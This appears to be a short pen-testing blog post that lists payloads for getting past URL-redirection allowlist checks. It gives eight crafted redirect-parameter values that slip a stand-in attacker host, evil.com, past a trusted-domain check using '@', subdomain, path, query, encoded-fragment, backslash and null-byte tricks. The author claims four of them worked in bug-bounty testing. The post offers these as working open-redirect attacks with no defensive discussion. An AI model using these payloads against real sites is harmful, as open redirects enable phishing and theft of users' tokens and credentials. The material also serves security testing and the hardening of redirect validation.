---
layout: post
title: 🚨 How to bypass URL redirection whitelist detection 🕵️‍♂️
categories: [Pen-test]
Description: How to bypass URL redirection whitelist detection.
keywords: URL redirection
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

Description: In this guide, you will learn how to bypass URL redirection white-list detection.

## 🚀 Quickstart

✅ The following bypass techniques I have really succeeded in SRC.

```shell
https://example.com/?url=target.com@evil.com

https://example.com/?url=target.com.evil.com

https://example.com/?url=evil.com/target.com

https://example.com/?url=evil.com?target.com
```

❌ I haven't succeeded in the following techniques in SRC, but you can also try it.

```shell
https://example.com/?url=target.com%23evil.com

https://example.com/?url=target.com\evil.com

https://example.com/?url=target.com\.evil.com

https://example.com/?url=target.com%00evil.com
```
